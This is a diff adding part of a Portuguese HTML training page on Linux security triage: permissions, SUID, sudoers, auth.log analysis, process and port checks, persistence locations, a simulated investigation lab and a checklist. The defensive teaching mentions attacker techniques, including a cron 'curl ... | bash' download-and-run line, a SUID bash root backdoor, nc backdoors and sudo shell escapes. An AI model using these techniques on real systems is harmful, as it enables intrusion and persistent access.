+  margin: 0 auto;
+}
+
+/* --------------------------------------------------------------------------
+   15. Rodapé e Referências
+   -------------------------------------------------------------------------- */
+.study-footer {
+  margin-top: 3.5rem;
+  padding-top: 1.5rem;
+  border-top: 1px solid var(--rule);
+  text-align: center;
+  font-size: 0.88rem;
+  color: var(--muted);
+}
+
+/* --------------------------------------------------------------------------
+   16. Responsividade & Impressão (@media)
+   -------------------------------------------------------------------------- */
+@media (max-width: 640px) {
+  h1 { font-size: 1.85rem; }
+  h2 { font-size: 1.45rem; }
+  .hero-header { padding: 1.25rem; }
+  .lab-body { padding: 1rem; }
+  .lab-controls { flex-direction: column; align-items: stretch; }
+  .top-nav-inner { padding: 0.5rem 1rem; }
+  .nav-title { display: none; }
+  .nav-actions .badge { display: none; }
+  .btn { overflow-wrap: anywhere; }
+  .edr-grid-container { grid-template-columns: minmax(0, 1fr); }
+}
+
+@media print {
+  body {
+    background-color: #FFFFFF !important;
+    color: #000000 !important;
+  }
+  .top-nav, .theme-toggle-btn, .btn-copy, .lab-controls button {
+    display: none !important;
+  }
+  .container {
+    max-width: 100% !important;
+    padding: 0 !important;
+  }
+  .hero-header, .lab-box, .checklist, .quiz-section {
+    border: 1px solid #CCC !important;
+    box-shadow: none !important;
+    break-inside: avoid;
+  }
+}
+
+  </style>
+</head>
+<body data-slug="Linux-para-Seguranca">
+
+  <!-- Barra de Navegação Superior e Breadcrumbs -->
+  <header class="top-nav">
+    <div class="top-nav-inner">
+      <a href="../index.html" class="nav-back">← Painel de Estudos</a>
+      <span class="nav-title">Linux para Segurança: Shell, Permissões e Logs</span>
+      <div class="nav-actions">
+        <span class="badge badge-t8">Trilha 8</span>
+        <button class="theme-toggle-btn" aria-label="Alternar tema" onclick="toggleTheme()">
+          <span class="theme-icon">🌙</span> <span class="theme-label">Escuro</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Conteúdo Principal do Treinamento -->
+  <main class="container">
+<!-- Estudo 34: Linux-para-Seguranca Body Fragment -->
+<article class="study-container" data-slug="linux-seguranca">
+
+    <!-- SEÇÃO 1: SISTEMA E PERMISSÕES -->
+    <section class="study-section" id="introducao">
+        <div class="section-header">
+            <span class="section-tag">Seção 01</span>
+            <h2>Introdução: O Servidor Conta o Que Aconteceu</h2>
+        </div>
+
+        <p class="lead-text">
+            A maior parte da internet roda em Linux, inclusive a loja online da Ipê Store. Quando um alerta aponta para um servidor Linux, o analista precisa responder em minutos: alguém entrou? Ganhou privilégio? Deixou um jeito de voltar? A resposta está em poucos lugares conhecidos, e a linha de comando é a forma mais rápida de chegar lá. Neste estudo você vai investigar o <strong>web-loja01</strong> com as mesmas ferramentas que usaria num servidor real.
+        </p>
+
+        <h3>Onde Fica Cada Coisa (FHS)</h3>
+        <p>
+            O <strong>FHS</strong> (<em>Filesystem Hierarchy Standard</em>) padroniza os diretórios. Os que mais importam numa investigação:
+        </p>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr><th>Diretório</th><th>Conteúdo</th><th>O que procurar</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>/etc</code></td><td>Configuração do sistema</td><td>Contas, sudoers, cron, SSH</td></tr>
+                    <tr><td><code>/var/log</code></td><td>Logs</td><td><code>auth.log</code> (Debian e Ubuntu) ou <code>/var/log/secure</code> (RHEL)</td></tr>
+                    <tr><td><code>/home</code> e <code>/root</code></td><td>Diretórios dos usuários</td><td>Histórico de comandos, chaves SSH, <code>.bashrc</code></td></tr>
+                    <tr><td><code>/tmp</code> e <code>/dev/shm</code></td><td>Arquivos temporários, graváveis por todos</td><td>Binários e scripts deixados por invasores, arquivos ocultos</td></tr>
+                    <tr><td><code>/srv</code> e <code>/var/www</code></td><td>Dados de serviços e sites</td><td>Webshells em pastas de upload</td></tr>
+                    <tr><td><code>/usr/bin</code> e <code>/usr/local/bin</code></td><td>Programas</td><td>Binários alterados ou com SUID inesperado</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Permissões</h3>
+        <p>
+            Cada arquivo tem dono, grupo e três trios de permissões: leitura (r = 4), escrita (w = 2) e execução (x = 1), para dono, grupo e outros. <code>chmod 750</code> dá rwx ao dono, r-x ao grupo e nada aos outros. A <strong>umask</strong> define o que é retirado na criação: com <code>022</code>, arquivos nascem 644 e diretórios 755.
+        </p>
+        <ul>
+            <li><strong>SUID</strong> (4000): o programa roda com os privilégios do dono. Legítimo em <code>passwd</code> e <code>sudo</code>; numa cópia do bash pertencente ao root, é uma porta de volta para root (T1548.001).</li>
+            <li><strong>SGID</strong> (2000): roda com o grupo do arquivo; em diretórios, os arquivos novos herdam o grupo.</li>
+            <li><strong>sticky bit</strong> (1000): num diretório como <code>/tmp</code> (1777), só o dono apaga os próprios arquivos.</li>
+        </ul>
+        <p>
+            Contas ficam em <code>/etc/passwd</code> (legível por todos, sem senha) e os hashes em <code>/etc/shadow</code> (só root e grupo shadow). O prefixo do hash indica o algoritmo: <code>$6$</code> é SHA-512 crypt; <code>$y$</code> é <strong>yescrypt</strong>, o padrão das distribuições recentes. Uma conta com UID 0 além do root é sinal de invasão.
+        </p>
+
+        <div class="callout danger">
+            <div class="callout-title">
+                <span class="callout-icon">🔑</span>
+                <strong>sudoers com NOPASSWD: ALL</strong>
+            </div>
+            <p>
+                Uma linha como <code>deploy ALL=(ALL) NOPASSWD: ALL</code> no <strong>sudoers</strong> transforma quem descobrir a senha do deploy em root, sem nenhuma outra pergunta. Mesmo regras restritas podem escapar: programas como <code>vim</code>, <code>find</code> ou <code>tar</code> permitem abrir um shell, e o projeto <strong>GTFOBins</strong> cataloga esses casos. Edite o sudoers sempre com <code>visudo</code>.
+            </p>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 2: INVESTIGAÇÃO -->
+    <section class="study-section" id="investigacao">
+        <div class="section-header">
+            <span class="section-tag">Seção 02</span>
+            <h2>Logs, Processos e Persistência</h2>
+        </div>
+
+        <div class="diagram-box">
+            <div class="diagram-header">
+                <span class="diagram-title">Roteiro de Investigação de um Servidor Linux</span>
+                <span class="diagram-badge">Mermaid</span>
+            </div>
+            <div class="diagram-box">
+  <div class="diagram-header">
+    <span class="diagram-title">Roteiro de Investigação de um Servidor Linux</span>
+    <span class="diagram-badge">Mermaid Arquitetura</span>
+  </div>
+  <div class="diagram-svg-wrap" role="img" aria-label="Roteiro de Investigação de um Servidor Linux">
+    <svg id="my-svg" width="100%" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="flowchart" style="max-width: 168px; background-color: transparent;" viewBox="4 4 168 776" role="graphics-document document" aria-roledescription="flowchart-v2"><style>#my-svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#ccc;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#my-svg .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#my-svg .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#my-svg .error-icon{fill:#a44141;}#my-svg .error-text{fill:#ddd;stroke:#ddd;}#my-svg .edge-thickness-normal{stroke-width:1px;}#my-svg .edge-thickness-thick{stroke-width:3.5px;}#my-svg .edge-pattern-solid{stroke-dasharray:0;}#my-svg .edge-thickness-invisible{stroke-width:0;fill:none;}#my-svg .edge-pattern-dashed{stroke-dasharray:3;}#my-svg .edge-pattern-dotted{stroke-dasharray:2;}#my-svg .marker{fill:lightgrey;stroke:lightgrey;}#my-svg .marker.cross{stroke:lightgrey;}#my-svg svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#my-svg p{margin:0;}#my-svg .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#ccc;}#my-svg .cluster-label text{fill:#F9FFFE;}#my-svg .cluster-label span{color:#F9FFFE;}#my-svg .cluster-label span p{background-color:transparent;}#my-svg .label text,#my-svg span{fill:#ccc;color:#ccc;}#my-svg .node rect,#my-svg .node circle,#my-svg .node ellipse,#my-svg .node polygon,#my-svg .node path{fill:#1f2020;stroke:#ccc;stroke-width:1px;}#my-svg .rough-node .label text,#my-svg .node .label text,#my-svg .image-shape .label,#my-svg .icon-shape .label{text-anchor:middle;}#my-svg .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#my-svg .rough-node .label,#my-svg .node .label,#my-svg .image-shape .label,#my-svg .icon-shape .label{text-align:center;}#my-svg .node.clickable{cursor:pointer;}#my-svg .root .anchor path{fill:lightgrey!important;stroke-width:0;stroke:lightgrey;}#my-svg .arrowheadPath{fill:lightgrey;}#my-svg .edgePaths .path{stroke:lightgrey;stroke-width:1px;}#my-svg .flowchart-link{stroke:lightgrey;fill:none;}#my-svg .edgeLabel{background-color:hsl(0, 0%, 34.4117647059%);text-align:center;}#my-svg .edgeLabel p{background-color:hsl(0, 0%, 34.4117647059%);}#my-svg .edgeLabel rect{opacity:0.5;background-color:hsl(0, 0%, 34.4117647059%);fill:hsl(0, 0%, 34.4117647059%);}#my-svg .labelBkg{background-color:rgba(87.75, 87.75, 87.75, 0.5);}#my-svg .cluster rect{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:rgba(255, 255, 255, 0.25);stroke-width:1px;}#my-svg .cluster text{fill:#F9FFFE;}#my-svg .cluster span{color:#F9FFFE;}#my-svg .node .collapsed-indicator{fill:rgba(255, 255, 255, 0.25);stroke:none;opacity:0.6;}#my-svg .node .collapsed-separator{stroke:rgba(255, 255, 255, 0.25);stroke-width:0.75px;}#my-svg div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(20, 1.5873015873%, 12.3529411765%);border:1px solid rgba(255, 255, 255, 0.25);border-radius:2px;pointer-events:none;z-index:100;}#my-svg .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#ccc;}#my-svg rect.text{fill:none;stroke-width:0;}#my-svg .icon-shape,#my-svg .image-shape{background-color:hsl(0, 0%, 34.4117647059%);text-align:center;}#my-svg .icon-shape p,#my-svg .image-shape p{background-color:hsl(0, 0%, 34.4117647059%);padding:2px;}#my-svg .icon-shape .label rect,#my-svg .image-shape .label rect{opacity:0.5;background-color:hsl(0, 0%, 34.4117647059%);fill:hsl(0, 0%, 34.4117647059%);}#my-svg .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#my-svg .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#my-svg .node .neo-node{stroke:#ccc;}#my-svg [data-look="neo"].node rect,#my-svg [data-look="neo"].cluster rect,#my-svg [data-look="neo"].node polygon{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].swimlane.cluster rect{filter:none;}#my-svg [data-look="neo"].node path{stroke:url(#my-svg-gradient);stroke-width:1px;}#my-svg [data-look="neo"].node .outer-path{filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].node .neo-line path{stroke:#ccc;filter:none;}#my-svg [data-look="neo"].node circle{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].node circle .state-start{fill:#000000;}#my-svg [data-look="neo"].icon-shape .icon{fill:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].icon-shape .icon-neo path{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker id="my-svg_flowchart-v2-pointEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-pointStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="4.5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 5 L 10 10 L 10 0 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-pointEnd-margin" class="marker flowchart-v2" viewBox="0 0 11.5 14" refX="11.5" refY="7" markerUnits="userSpaceOnUse" markerWidth="10.5" markerHeight="14" orient="auto"><path d="M 0 0 L 11.5 7 L 0 14 z" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-pointStart-margin" class="marker flowchart-v2" viewBox="0 0 11.5 14" refX="1" refY="7" markerUnits="userSpaceOnUse" markerWidth="11.5" markerHeight="14" orient="auto"><polygon points="0,7 11.5,14 11.5,0" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="11" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-1" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleEnd-margin" class="marker flowchart-v2" viewBox="0 0 10 10" refY="5" refX="12.25" markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleStart-margin" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-2" refY="5" markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-crossEnd" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="12" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-crossStart" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="-1" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-crossEnd-margin" class="marker cross flowchart-v2" viewBox="0 0 15 15" refX="17.7" refY="7.5" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto"><path d="M 1,1 L 14,14 M 1,14 L 14,1" class="arrowMarkerPath" style="stroke-width: 2.5;"/></marker><marker id="my-svg_flowchart-v2-crossStart-margin" class="marker cross flowchart-v2" viewBox="0 0 15 15" refX="-3.5" refY="7.5" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto"><path d="M 1,1 L 14,14 M 1,14 L 14,1" class="arrowMarkerPath" style="stroke-width: 2.5; stroke-dasharray: 1, 0;"/></marker><g class="root"><g class="clusters"/><g class="edges edgePaths"><path d="M88,108L88,144" id="my-svg-L_A_B_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_A_B_0" data-points="W3sieCI6ODgsInkiOjEwOH0seyJ4Ijo4OCwieSI6MTQ4fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,268L88,304" id="my-svg-L_B_C_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_B_C_0" data-points="W3sieCI6ODgsInkiOjI2OH0seyJ4Ijo4OCwieSI6MzA4fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,428L88,464" id="my-svg-L_C_D_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_C_D_0" data-points="W3sieCI6ODgsInkiOjQyOH0seyJ4Ijo4OCwieSI6NDY4fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,612L88,648" id="my-svg-L_D_E_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_D_E_0" data-points="W3sieCI6ODgsInkiOjYxMn0seyJ4Ijo4OCwieSI6NjUyfV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/></g><g class="edgeLabels"/><g class="nodes"><g class="node default" id="my-svg-flowchart-A-0" data-look="neo" transform="translate(88, 60)"><rect class="basic label-container" style="" x="-76" y="-48" width="152" height="96"/><g class="label" style="" transform="translate(-60, -36)"><rect/><foreignObject width="120" height="72"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>1. Quem entrou?<br /><small>auth.log, journalctl, last</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-B-1" data-look="neo" transform="translate(88, 208)"><rect class="basic label-container" style="" x="-76" y="-60" width="152" height="120"/><g class="label" style="" transform="translate(-60, -48)"><rect/><foreignObject width="120" height="96"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>2. O que está rodando agora?<br /><small>ps aux, ss -tlnp, lsof</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-C-2" data-look="neo" transform="translate(88, 368)"><rect class="basic label-container" style="" x="-76" y="-60" width="152" height="120"/><g class="label" style="" transform="translate(-60, -48)"><rect/><foreignObject width="120" height="96"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>3. Ganhou privilégio?<br /><small>sudoers, SUID, contas com UID 0</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-D-3" data-look="neo" transform="translate(88, 540)"><rect class="basic label-container" style="" x="-76" y="-72" width="152" height="144"/><g class="label" style="" transform="translate(-60, -60)"><rect/><foreignObject width="120" height="120"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>4. Deixou um jeito de voltar?<br /><small>cron, systemd, authorized_keys, .bashrc</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-E-4" data-look="neo" transform="translate(88, 712)"><rect class="basic label-container" style="" x="-76" y="-60" width="152" height="120"/><g class="label" style="" transform="translate(-60, -48)"><rect/><foreignObject width="120" height="96"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>5. O que alterou?<br /><small>arquivos recentes, uploads, histórico</small></p></span></div></foreignObject></g></g></g></g></g><defs><filter id="my-svg-drop-shadow" height="130%" width="130%"><feDropShadow dx="4" dy="4" stdDeviation="0" flood-opacity="0.06" flood-color="#FFFFFF"/></filter></defs><defs><filter id="my-svg-drop-shadow-small" height="150%" width="150%"><feDropShadow dx="2" dy="2" stdDeviation="0" flood-opacity="0.06" flood-color="#FFFFFF"/></filter></defs><linearGradient id="my-svg-gradient" gradientUnits="objectBoundingBox" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#cccccc" stop-opacity="1"/><stop offset="100%" stop-color="hsl(180, 0%, 18.3529411765%)" stop-opacity="1"/></linearGradient></svg>
+  </div>
+</div>
+        </div>
+
+        <h3>Quem Entrou</h3>
+        <p>
+            O SSH registra cada tentativa no <code>auth.log</code>; com systemd, o mesmo aparece em <code>journalctl -u ssh</code> (a unidade se chama <code>sshd</code> no RHEL). Muitas linhas <em>Failed password</em> de um IP, seguidas de <em>Accepted password</em> do mesmo IP, indicam força bruta bem-sucedida (T1110). Os pipes resumem milhares de linhas em segundos:
+        </p>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <span class="terminal-title">bash — triagem de um servidor</span>
+                <button class="terminal-copy-btn" onclick="copyCode(this, 'code-lx-triagem')">Copiar</button>
+            </div>
+            <pre><code id="code-lx-triagem"># IPs com mais falhas de senha (funciona com e sem "invalid user")
+grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head
+
+# Logins aceitos
+grep "Accepted" /var/log/auth.log
+
+# Processos e portas abertas, com o programa dono de cada porta
+ps aux
+ss -tlnp
+lsof -i -P -n
+
+# Binários SUID e arquivos graváveis por todos
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -0002 -type d 2&gt;/dev/null
+
+# Persistência
+ls -la /etc/cron.d; cat /etc/crontab; crontab -l -u root
+systemctl list-timers; systemctl list-unit-files --type=service --state=enabled</code></pre>
+        </div>
+
+        <div class="callout warning">
+            <div class="callout-title">
+                <span class="callout-icon">🧮</span>
+                <strong>A coluna do IP muda</strong>
+            </div>
+            <p>
+                Em <em>Failed password for root from 198.51.100.23 port 50100 ssh2</em>, o IP é a 11ª coluna. Em <em>Failed password for <strong>invalid user</strong> admin from 198.51.100.23 port 50106 ssh2</em>, as duas palavras extras empurram o IP para a 13ª. Contar só <code>$11</code> mistura IPs com nomes de usuário (<code>admin</code>, <code>ubuntu</code>), e a contagem do atacante cai pela metade. Conte a partir do fim (<code>$(NF-3)</code>) ou extraia o IP com <code>grep -oE '[0-9]+(\.[0-9]+){3}'</code>.
+            </p>
+        </div>
+
+        <h3>Processos e Portas</h3>
+        <p>
+            <code>ps aux</code> mostra cada processo com usuário e linha de comando; procure shells rodando de <code>/tmp</code>, processos com nomes de sistema em caminhos estranhos e conexões reversas. <code>ss -tlnp</code> lista as portas em escuta e o processo dono; uma porta alta aberta por <code>nc</code> é um <em>backdoor</em>. <code>lsof</code> liga arquivos e conexões aos processos que os usam.
+        </p>
+
+        <h3>Persistência</h3>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr><th>Mecanismo</th><th>Onde olhar</th><th>MITRE ATT&amp;CK</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Cron</td><td><code>/etc/crontab</code>, <code>/etc/cron.d</code>, <code>/var/spool/cron/crontabs</code> (<code>crontab -l -u usuário</code>)</td><td>T1053.003</td></tr>
+                    <tr><td>Serviços e timers do <strong>systemd</strong></td><td><code>/etc/systemd/system</code>, <code>systemctl list-timers</code></td><td>T1543.002</td></tr>
+                    <tr><td>Chaves SSH</td><td><code>~/.ssh/authorized_keys</code> de cada usuário</td><td>T1098.004</td></tr>
+                    <tr><td>Inicialização do shell</td><td><code>.bashrc</code>, <code>.profile</code>, <code>/etc/profile.d</code></td><td>T1546.004</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <p>
+            Um cron que roda a cada minuto um <code>curl ... | bash</code> baixa e executa o que o atacante quiser, sempre que quiser. Remover o arquivo do cron sem trocar as credenciais e sem tirar a chave SSH extra só adia a volta dele.
+        </p>
+    </section>
+
+    <!-- SEÇÃO 3: SIMULADOR -->
+    <section class="study-section" id="simulador">
+        <div class="section-header">
+            <span class="section-tag">Seção 03</span>
+            <h2>Laboratório Prático: Terminal de Investigação Linux</h2>
+        </div>
+
+        <p class="lead-text">
+            O alerta: o web-loja01 está fazendo conexões de saída estranhas. Use o terminal para investigar e cumpra as missões. Os comandos funcionam com pipes, aspas e opções comuns; digite <code>help</code> para a lista.
+        </p>
+
+        <div class="lab-box lx-lab" id="lx-lab">
+            <div class="lab-header">
+                <div>
+                    <span class="lab-badge">Laboratório de Linux</span>
+                    <h3 style="margin: 0.4rem 0 0.2rem 0;">root@web-loja01</h3>
+                    <p id="lx-contexto" style="margin: 0; font-size: 0.9rem; color: var(--muted);"></p>
+                </div>
+            </div>
+
+            <div class="lab-body">
+                <div style="background: #0f172a; color: #e2e8f0; border-radius: var(--radius-md); padding: 0.75rem; font-family: var(--font-mono); font-size: 0.78rem; border: 1px solid #334155;">
+                    <div id="lx-terminal" role="log" aria-live="polite" aria-label="Saída do terminal" style="max-height: 26rem; overflow: auto; white-space: pre; line-height: 1.45; margin-bottom: 0.5rem;" tabindex="0"></div>
+                    <div style="display: flex; align-items: center; gap: 0.4rem; border-top: 1px solid #1e293b; padding-top: 0.5rem;">
+                        <span id="lx-prompt" style="color: #4ade80; white-space: nowrap;"></span>
+                        <input type="text" id="lx-entrada" aria-label="Comando" autocomplete="off" autocapitalize="off" spellcheck="false" style="flex: 1; min-width: 0; background: transparent; border: none; outline: none; color: #f8fafc; font-family: inherit; font-size: inherit;">
+                        <button class="btn-primary" type="button" id="lx-executar" style="padding: 0.2rem 0.7rem; font-size: 0.78rem;">Executar</button>
+                    </div>
+                </div>
+                <div id="lx-atalhos" style="display: flex; flex-wrap: wrap; gap: 0.35rem; margin-top: 0.5rem;"></div>
+
+                <h4 style="margin-top: 1.5rem;">Missões</h4>
+                <div id="lx-missoes" style="display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.9rem; font-size: 0.88rem;">
+                    <div>
+                        <label for="lx-m1" style="display: block; margin-bottom: 0.3rem;"><strong>1.</strong> Qual binário SUID está fora do padrão? (caminho completo)</label>
+                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;"><input class="form-control" type="text" id="lx-m1" autocomplete="off" style="flex: 1 1 200px; min-width: 0;"><button class="btn-secondary" type="button" onclick="verificarMissaoLinux(1)">Verificar</button></div>
+                        <p id="lx-r1" style="margin: 0.3rem 0 0 0;"></p>
+                    </div>
+                    <div>
+                        <label for="lx-m2ip" style="display: block; margin-bottom: 0.3rem;"><strong>2.</strong> Qual IP fez a força bruta, e com qual conta entrou?</label>
+                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                            <input class="form-control" type="text" id="lx-m2ip" placeholder="IP" autocomplete="off" style="flex: 1 1 140px; min-width: 0;">
+                            <input class="form-control" type="text" id="lx-m2conta" placeholder="conta" aria-label="Conta" autocomplete="off" style="flex: 1 1 120px; min-width: 0;">
+                            <button class="btn-secondary" type="button" onclick="verificarMissaoLinux(2)">Verificar</button>
+                        </div>
+                        <p id="lx-r2" style="margin: 0.3rem 0 0 0;"></p>
+                    </div>
+                    <div>
+                        <p style="margin: 0 0 0.3rem 0;"><strong>3.</strong> Corrija a permissão de <code>/srv/app/uploads</code> no terminal: ninguém além do dono e do grupo deve poder gravar nela. Depois verifique.</p>
+                        <button class="btn-secondary" type="button" onclick="verificarMissaoLinux(3)">Verificar permissão</button>
+                        <p id="lx-r3" style="margin: 0.3rem 0 0 0;"></p>
+                    </div>
+                    <div>
+                        <label for="lx-m4" style="display: block; margin-bottom: 0.3rem;"><strong>4.</strong> Qual arquivo de cron é a persistência do invasor? (caminho completo)</label>
+                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;"><input class="form-control" type="text" id="lx-m4" autocomplete="off" style="flex: 1 1 200px; min-width: 0;"><button class="btn-secondary" type="button" onclick="verificarMissaoLinux(4)">Verificar</button></div>
+                        <p id="lx-r4" style="margin: 0.3rem 0 0 0;"></p>
+                    </div>
+                </div>
+
+                <div style="margin-top: 1.25rem;">
+                    <button class="btn-secondary" type="button" onclick="restaurarLinux()">Restaurar laboratório</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 4: CHECKLIST -->
+    <section class="study-section" id="checklist">
+        <div class="section-header">
+            <span class="section-tag">Seção 04</span>
+            <h2>Checklist de Triagem de Servidor Linux</h2>
+        </div>
+
+        <p class="lead-text">
+            Use esta lista na primeira hora de investigação de um servidor Linux. O estado das caixas fica salvo no seu navegador.
+        </p>
+
+        <ul class="checklist" data-checklist-slug="linux-seguranca">
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-1">
+                <label for="chk-lx-1"><strong>Logins revisados:</strong> falhas e acessos aceitos no auth.log ou journalctl, com IPs de origem e contas.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-2">
+                <label for="chk-lx-2"><strong>Processos e portas:</strong> ps aux e ss -tlnp conferidos, sem shells em /tmp nem portas abertas por programas inesperados.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-3">
+                <label for="chk-lx-3"><strong>Privilégios:</strong> sudoers sem NOPASSWD amplo, nenhuma conta extra com UID 0, SUID só nos binários esperados.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-lx-4">
+                <label for="chk-lx-4"><strong>Persistência:</strong> cron, timers e serviços do systemd, authorized_keys e arquivos de inicialização do shell revisados.</label>
+            </li>
